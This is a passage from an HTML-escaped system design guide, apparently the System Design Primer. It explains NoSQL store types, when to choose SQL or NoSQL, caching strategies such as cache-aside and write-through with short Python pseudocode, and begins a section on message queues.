queries&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/1217466/is-there-a-good-reason-i-see-varchar255-used-so-often-as-opposed-to-another-l&#34;&gt;Is there a good reason i see VARCHAR(255) used so often?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/1017239/how-do-null-values-affect-performance-in-a-database-search&#34;&gt;How do null values affect performance?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://dev.mysql.com/doc/refman/5.7/en/slow-query-log.html&#34;&gt;Slow query log&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;NoSQL&lt;/h3&gt; &#xA;&lt;p&gt;NoSQL is a collection of data items represented in a &lt;strong&gt;key-value store&lt;/strong&gt;, &lt;strong&gt;document store&lt;/strong&gt;, &lt;strong&gt;wide column store&lt;/strong&gt;, or a &lt;strong&gt;graph database&lt;/strong&gt;. Data is denormalized, and joins are generally done in the application code. Most NoSQL stores lack true ACID transactions and favor &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#eventual-consistency&#34;&gt;eventual consistency&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;BASE&lt;/strong&gt; is often used to describe the properties of NoSQL databases. In comparison with the &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#cap-theorem&#34;&gt;CAP Theorem&lt;/a&gt;, BASE chooses availability over consistency.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Basically available&lt;/strong&gt; - the system guarantees availability.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Soft state&lt;/strong&gt; - the state of the system may change over time, even without input.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Eventual consistency&lt;/strong&gt; - the system will become consistent over a period of time, given that the system doesn&#39;t receive input during that period.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;In addition to choosing between &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#sql-or-nosql&#34;&gt;SQL or NoSQL&lt;/a&gt;, it is helpful to understand which type of NoSQL database best fits your use case(s). We&#39;ll review &lt;strong&gt;key-value stores&lt;/strong&gt;, &lt;strong&gt;document stores&lt;/strong&gt;, &lt;strong&gt;wide column stores&lt;/strong&gt;, and &lt;strong&gt;graph databases&lt;/strong&gt; in the next section.&lt;/p&gt; &#xA;&lt;h4&gt;Key-value store&lt;/h4&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Abstraction: hash table&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;A key-value store generally allows for O(1) reads and writes and is often backed by memory or SSD. Data stores can maintain keys in &lt;a href=&#34;https://en.wikipedia.org/wiki/Lexicographical_order&#34;&gt;lexicographic order&lt;/a&gt;, allowing efficient retrieval of key ranges. Key-value stores can allow for storing of metadata with a value.&lt;/p&gt; &#xA;&lt;p&gt;Key-value stores provide high performance and are often used for simple data models or for rapidly-changing data, such as an in-memory cache layer. Since they offer only a limited set of operations, complexity is shifted to the application layer if additional operations are needed.&lt;/p&gt; &#xA;&lt;p&gt;A key-value store is the basis for more complex systems such as a document store, and in some cases, a graph database.&lt;/p&gt; &#xA;&lt;h5&gt;Source(s) and further reading: key-value store&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Key-value_database&#34;&gt;Key-value database&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/4056093/what-are-the-disadvantages-of-using-a-key-value-table-over-nullable-columns-or&#34;&gt;Disadvantages of key-value stores&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://qnimate.com/overview-of-redis-architecture/&#34;&gt;Redis architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://adayinthelifeof.nl/2011/02/06/memcache-internals/&#34;&gt;Memcached architecture&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Document store&lt;/h4&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Abstraction: key-value store with documents stored as values&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;A document store is centered around documents (XML, JSON, binary, etc), where a document stores all information for a given object. Document stores provide APIs or a query language to query based on the internal structure of the document itself. &lt;em&gt;Note, many key-value stores include features for working with a value&#39;s metadata, blurring the lines between these two storage types.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;Based on the underlying implementation, documents are organized by collections, tags, metadata, or directories. Although documents can be organized or grouped together, documents may have fields that are completely different from each other.&lt;/p&gt; &#xA;&lt;p&gt;Some document stores like &lt;a href=&#34;https://www.mongodb.com/mongodb-architecture&#34;&gt;MongoDB&lt;/a&gt; and &lt;a href=&#34;https://blog.couchdb.org/2016/08/01/couchdb-2-0-architecture/&#34;&gt;CouchDB&lt;/a&gt; also provide a SQL-like language to perform complex queries. &lt;a href=&#34;http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/decandia07dynamo.pdf&#34;&gt;DynamoDB&lt;/a&gt; supports both key-values and documents.&lt;/p&gt; &#xA;&lt;p&gt;Document stores provide high flexibility and are often used for working with occasionally changing data.&lt;/p&gt; &#xA;&lt;h5&gt;Source(s) and further reading: document store&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Document-oriented_database&#34;&gt;Document-oriented database&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mongodb.com/mongodb-architecture&#34;&gt;MongoDB architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.couchdb.org/2016/08/01/couchdb-2-0-architecture/&#34;&gt;CouchDB architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.elastic.co/blog/found-elasticsearch-from-the-bottom-up&#34;&gt;Elasticsearch architecture&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Wide column store&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/n16iOGk.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://blog.grio.com/2015/11/sql-nosql-a-brief-history.html&#34;&gt;Source: SQL &amp;amp; NoSQL, a brief history&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Abstraction: nested map &lt;code&gt;ColumnFamily&amp;lt;RowKey, Columns&amp;lt;ColKey, Value, Timestamp&amp;gt;&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;A wide column store&#39;s basic unit of data is a column (name/value pair). A column can be grouped in column families (analogous to a SQL table). Super column families further group column families. You can access each column independently with a row key, and columns with the same row key form a row. Each value contains a timestamp for versioning and for conflict resolution.&lt;/p&gt; &#xA;&lt;p&gt;Google introduced &lt;a href=&#34;http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/chang06bigtable.pdf&#34;&gt;Bigtable&lt;/a&gt; as the first wide column store, which influenced the open-source &lt;a href=&#34;https://www.edureka.co/blog/hbase-architecture/&#34;&gt;HBase&lt;/a&gt; often-used in the Hadoop ecosystem, and &lt;a href=&#34;http://docs.datastax.com/en/cassandra/3.0/cassandra/architecture/archIntro.html&#34;&gt;Cassandra&lt;/a&gt; from Facebook. Stores such as BigTable, HBase, and Cassandra maintain keys in lexicographic order, allowing efficient retrieval of selective key ranges.&lt;/p&gt; &#xA;&lt;p&gt;Wide column stores offer high availability and high scalability. They are often used for very large data sets.&lt;/p&gt; &#xA;&lt;h5&gt;Source(s) and further reading: wide column store&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://blog.grio.com/2015/11/sql-nosql-a-brief-history.html&#34;&gt;SQL &amp;amp; NoSQL, a brief history&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/chang06bigtable.pdf&#34;&gt;Bigtable architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.edureka.co/blog/hbase-architecture/&#34;&gt;HBase architecture&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://docs.datastax.com/en/cassandra/3.0/cassandra/architecture/archIntro.html&#34;&gt;Cassandra architecture&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Graph database&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/fNcl65g.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/File:GraphDatabase_PropertyGraph.png&#34;&gt;Source: Graph database&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Abstraction: graph&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;In a graph database, each node is a record and each arc is a relationship between two nodes. Graph databases are optimized to represent complex relationships with many foreign keys or many-to-many relationships.&lt;/p&gt; &#xA;&lt;p&gt;Graphs databases offer high performance for data models with complex relationships, such as a social network. They are relatively new and are not yet widely-used; it might be more difficult to find development tools and resources. Many graphs can only be accessed with &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#representational-state-transfer-rest&#34;&gt;REST APIs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h5&gt;Source(s) and further reading: graph&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Graph_database&#34;&gt;Graph database&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://neo4j.com/&#34;&gt;Neo4j&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.twitter.com/2010/introducing-flockdb&#34;&gt;FlockDB&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Source(s) and further reading: NoSQL&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/3342497/explanation-of-base-terminology&#34;&gt;Explanation of base terminology&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/baqend-blog/nosql-databases-a-survey-and-decision-guidance-ea7823a822d#.wskogqenq&#34;&gt;NoSQL databases a survey and decision guidance&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.lecloud.net/post/7994751381/scalability-for-dummies-part-2-database&#34;&gt;Scalability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=qI_g07C_Q5I&#34;&gt;Introduction to NoSQL&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://horicky.blogspot.com/2009/11/nosql-patterns.html&#34;&gt;NoSQL patterns&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;SQL or NoSQL&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/wXGqG5f.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;https://www.infoq.com/articles/Transition-RDBMS-NoSQL/&#34;&gt;Source: Transitioning from RDBMS to NoSQL&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;Reasons for &lt;strong&gt;SQL&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Structured data&lt;/li&gt; &#xA; &lt;li&gt;Strict schema&lt;/li&gt; &#xA; &lt;li&gt;Relational data&lt;/li&gt; &#xA; &lt;li&gt;Need for complex joins&lt;/li&gt; &#xA; &lt;li&gt;Transactions&lt;/li&gt; &#xA; &lt;li&gt;Clear patterns for scaling&lt;/li&gt; &#xA; &lt;li&gt;More established: developers, community, code, tools, etc&lt;/li&gt; &#xA; &lt;li&gt;Lookups by index are very fast&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Reasons for &lt;strong&gt;NoSQL&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Semi-structured data&lt;/li&gt; &#xA; &lt;li&gt;Dynamic or flexible schema&lt;/li&gt; &#xA; &lt;li&gt;Non-relational data&lt;/li&gt; &#xA; &lt;li&gt;No need for complex joins&lt;/li&gt; &#xA; &lt;li&gt;Store many TB (or PB) of data&lt;/li&gt; &#xA; &lt;li&gt;Very data intensive workload&lt;/li&gt; &#xA; &lt;li&gt;Very high throughput for IOPS&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Sample data well-suited for NoSQL:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Rapid ingest of clickstream and log data&lt;/li&gt; &#xA; &lt;li&gt;Leaderboard or scoring data&lt;/li&gt; &#xA; &lt;li&gt;Temporary data, such as a shopping cart&lt;/li&gt; &#xA; &lt;li&gt;Frequently accessed (&#39;hot&#39;) tables&lt;/li&gt; &#xA; &lt;li&gt;Metadata/lookup tables&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Source(s) and further reading: SQL or NoSQL&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=kKjm4ehYiMs&#34;&gt;Scaling up to your first 10 million users&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.sitepoint.com/sql-vs-nosql-differences/&#34;&gt;SQL vs NoSQL differences&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Cache&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/Q6z24La.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://horicky.blogspot.com/2010/10/scalable-system-design-patterns.html&#34;&gt;Source: Scalable system design patterns&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;Caching improves page load times and can reduce the load on your servers and databases. In this model, the dispatcher will first lookup if the request has been made before and try to find the previous result to return, in order to save the actual execution.&lt;/p&gt; &#xA;&lt;p&gt;Databases often benefit from a uniform distribution of reads and writes across its partitions. Popular items can skew the distribution, causing bottlenecks. Putting a cache in front of a database can help absorb uneven loads and spikes in traffic.&lt;/p&gt; &#xA;&lt;h3&gt;Client caching&lt;/h3&gt; &#xA;&lt;p&gt;Caches can be located on the client side (OS or browser), &lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#reverse-proxy-web-server&#34;&gt;server side&lt;/a&gt;, or in a distinct cache layer.&lt;/p&gt; &#xA;&lt;h3&gt;CDN caching&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#content-delivery-network&#34;&gt;CDNs&lt;/a&gt; are considered a type of cache.&lt;/p&gt; &#xA;&lt;h3&gt;Web server caching&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/#reverse-proxy-web-server&#34;&gt;Reverse proxies&lt;/a&gt; and caches such as &lt;a href=&#34;https://www.varnish-cache.org/&#34;&gt;Varnish&lt;/a&gt; can serve static and dynamic content directly. Web servers can also cache requests, returning responses without having to contact application servers.&lt;/p&gt; &#xA;&lt;h3&gt;Database caching&lt;/h3&gt; &#xA;&lt;p&gt;Your database usually includes some level of caching in a default configuration, optimized for a generic use case. Tweaking these settings for specific usage patterns can further boost performance.&lt;/p&gt; &#xA;&lt;h3&gt;Application caching&lt;/h3&gt; &#xA;&lt;p&gt;In-memory caches such as Memcached and Redis are key-value stores between your application and your data storage. Since the data is held in RAM, it is much faster than typical databases where data is stored on disk. RAM is more limited than disk, so &lt;a href=&#34;https://en.wikipedia.org/wiki/Cache_algorithms&#34;&gt;cache invalidation&lt;/a&gt; algorithms such as &lt;a href=&#34;https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)&#34;&gt;least recently used (LRU)&lt;/a&gt; can help invalidate &#39;cold&#39; entries and keep &#39;hot&#39; data in RAM.&lt;/p&gt; &#xA;&lt;p&gt;Redis has the following additional features:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Persistence option&lt;/li&gt; &#xA; &lt;li&gt;Built-in data structures such as sorted sets and lists&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;There are multiple levels you can cache that fall into two general categories: &lt;strong&gt;database queries&lt;/strong&gt; and &lt;strong&gt;objects&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Row level&lt;/li&gt; &#xA; &lt;li&gt;Query-level&lt;/li&gt; &#xA; &lt;li&gt;Fully-formed serializable objects&lt;/li&gt; &#xA; &lt;li&gt;Fully-rendered HTML&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Generally, you should try to avoid file-based caching, as it makes cloning and auto-scaling more difficult.&lt;/p&gt; &#xA;&lt;h3&gt;Caching at the database query level&lt;/h3&gt; &#xA;&lt;p&gt;Whenever you query the database, hash the query as a key and store the result to the cache. This approach suffers from expiration issues:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hard to delete a cached result with complex queries&lt;/li&gt; &#xA; &lt;li&gt;If one piece of data changes such as a table cell, you need to delete all cached queries that might include the changed cell&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Caching at the object level&lt;/h3&gt; &#xA;&lt;p&gt;See your data as an object, similar to what you do with your application code. Have your application assemble the dataset from the database into a class instance or a data structure(s):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Remove the object from cache if its underlying data has changed&lt;/li&gt; &#xA; &lt;li&gt;Allows for asynchronous processing: workers assemble objects by consuming the latest cached object&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Suggestions of what to cache:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;User sessions&lt;/li&gt; &#xA; &lt;li&gt;Fully rendered web pages&lt;/li&gt; &#xA; &lt;li&gt;Activity streams&lt;/li&gt; &#xA; &lt;li&gt;User graph data&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;When to update the cache&lt;/h3&gt; &#xA;&lt;p&gt;Since you can only store a limited amount of data in cache, you&#39;ll need to determine which cache update strategy works best for your use case.&lt;/p&gt; &#xA;&lt;h4&gt;Cache-aside&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/ONjORqk.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.slideshare.net/tmatyashovsky/from-cache-to-in-memory-data-grid-introduction-to-hazelcast&#34;&gt;Source: From cache to in-memory data grid&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;The application is responsible for reading and writing from storage. The cache does not interact with storage directly. The application does the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Look for entry in cache, resulting in a cache miss&lt;/li&gt; &#xA; &lt;li&gt;Load entry from the database&lt;/li&gt; &#xA; &lt;li&gt;Add entry to cache&lt;/li&gt; &#xA; &lt;li&gt;Return entry&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def get_user(self, user_id):&#xA;    user = cache.get(&#34;user.{0}&#34;, user_id)&#xA;    if user is None:&#xA;        user = db.query(&#34;SELECT * FROM users WHERE user_id = {0}&#34;, user_id)&#xA;        if user is not None:&#xA;            key = &#34;user.{0}&#34;.format(user_id)&#xA;            cache.set(key, json.dumps(user))&#xA;    return user&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://memcached.org/&#34;&gt;Memcached&lt;/a&gt; is generally used in this manner.&lt;/p&gt; &#xA;&lt;p&gt;Subsequent reads of data added to cache are fast. Cache-aside is also referred to as lazy loading. Only requested data is cached, which avoids filling up the cache with data that isn&#39;t requested.&lt;/p&gt; &#xA;&lt;h5&gt;Disadvantage(s): cache-aside&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Each cache miss results in three trips, which can cause a noticeable delay.&lt;/li&gt; &#xA; &lt;li&gt;Data can become stale if it is updated in the database. This issue is mitigated by setting a time-to-live (TTL) which forces an update of the cache entry, or by using write-through.&lt;/li&gt; &#xA; &lt;li&gt;When a node fails, it is replaced by a new, empty node, increasing latency.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Write-through&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/0vBc0hN.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.slideshare.net/jboner/scalability-availability-stability-patterns/&#34;&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;The application uses the cache as the main data store, reading and writing data to it, while the cache is responsible for reading and writing to the database:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Application adds/updates entry in cache&lt;/li&gt; &#xA; &lt;li&gt;Cache synchronously writes entry to data store&lt;/li&gt; &#xA; &lt;li&gt;Return&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Application code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;set_user(12345, {&#34;foo&#34;:&#34;bar&#34;})&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Cache code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def set_user(user_id, values):&#xA;    user = db.query(&#34;UPDATE Users WHERE id = {0}&#34;, user_id, values)&#xA;    cache.set(user_id, user)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Write-through is a slow overall operation due to the write operation, but subsequent reads of just written data are fast. Users are generally more tolerant of latency when updating data than reading data. Data in the cache is not stale.&lt;/p&gt; &#xA;&lt;h5&gt;Disadvantage(s): write through&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;When a new node is created due to failure or scaling, the new node will not cache entries until the entry is updated in the database. Cache-aside in conjunction with write through can mitigate this issue.&lt;/li&gt; &#xA; &lt;li&gt;Most data written might never be read, which can be minimized with a TTL.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Write-behind (write-back)&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/rgSrvjG.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.slideshare.net/jboner/scalability-availability-stability-patterns/&#34;&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;In write-behind, the application does the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Add/update entry in cache&lt;/li&gt; &#xA; &lt;li&gt;Asynchronously write entry to the data store, improving write performance&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h5&gt;Disadvantage(s): write-behind&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;There could be data loss if the cache goes down prior to its contents hitting the data store.&lt;/li&gt; &#xA; &lt;li&gt;It is more complex to implement write-behind than it is to implement cache-aside or write-through.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Refresh-ahead&lt;/h4&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/kxtjqgE.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://www.slideshare.net/tmatyashovsky/from-cache-to-in-memory-data-grid-introduction-to-hazelcast&#34;&gt;Source: From cache to in-memory data grid&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;You can configure the cache to automatically refresh any recently accessed cache entry prior to its expiration.&lt;/p&gt; &#xA;&lt;p&gt;Refresh-ahead can result in reduced latency vs read-through if the cache can accurately predict which items are likely to be needed in the future.&lt;/p&gt; &#xA;&lt;h5&gt;Disadvantage(s): refresh-ahead&lt;/h5&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Not accurately predicting which items are likely to be needed in the future can result in reduced performance than without refresh-ahead.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Disadvantage(s): cache&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Need to maintain consistency between caches and the source of truth such as the database through &lt;a href=&#34;https://en.wikipedia.org/wiki/Cache_algorithms&#34;&gt;cache invalidation&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Cache invalidation is a difficult problem, there is additional complexity associated with when to update the cache.&lt;/li&gt; &#xA; &lt;li&gt;Need to make application changes such as adding Redis or memcached.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Source(s) and further reading&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.slideshare.net/tmatyashovsky/from-cache-to-in-memory-data-grid-introduction-to-hazelcast&#34;&gt;From cache to in-memory data grid&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://horicky.blogspot.com/2010/10/scalable-system-design-patterns.html&#34;&gt;Scalable system design patterns&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://lethain.com/introduction-to-architecting-systems-for-scale/&#34;&gt;Introduction to architecting systems for scale&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.slideshare.net/jboner/scalability-availability-stability-patterns/&#34;&gt;Scalability, availability, stability, patterns&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.lecloud.net/post/9246290032/scalability-for-dummies-part-3-cache&#34;&gt;Scalability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://docs.aws.amazon.com/AmazonElastiCache/latest/UserGuide/Strategies.html&#34;&gt;AWS ElastiCache strategies&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Cache_(computing)&#34;&gt;Wikipedia&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Asynchronism&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/donnemartin/system-design-primer/master/images/54GYsSx.png&#34;&gt; &lt;br&gt; &lt;i&gt;&lt;a href=&#34;http://lethain.com/introduction-to-architecting-systems-for-scale/#platform_layer&#34;&gt;Source: Intro to architecting systems for scale&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; &#xA;&lt;p&gt;Asynchronous workflows help reduce request times for expensive operations that would otherwise be performed in-line. They can also help by doing time-consuming work in advance, such as periodic aggregation of data.&lt;/p&gt; &#xA;&lt;h3&gt;Message queues&lt;/h3&gt; &#xA;&lt;p&gt;Message queues receive, hold, and deliver messages. If an operation is too slow to perform inline, you can use a message queue with the following workflow:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;An application publishes a job to the queue, then notifies the user of job status&lt;/li&gt; &#xA; &lt;li&gt;A worker picks up the job from the queue, processes it, then signals the job is complete&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The user is not blocked and the job is processed in the background. During this time, the client might optionally do a small amount of processing to make it seem like the task has completed. For example, if posting a tweet, the tweet could be instantly posted to your timeline, but it could take some time before your tweet is actually delivered to all of your followers.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://redis.io/&#34;&gt;Redis&lt;/a&gt;&lt;/strong&gt; is useful as a simple message broker but messages can be lost.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://www.rabbitmq.com/&#34;&gt;RabbitMQ&lt;/a&gt;&lt;/strong&gt; is popular but requires you to adapt to the &#39;AMQP&#39; protocol and manage your own nodes.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://aws.amazon.com/sqs/&#34;&gt;Amazon SQS&lt;/a&gt;&lt;/strong&gt; is hosted but can have high 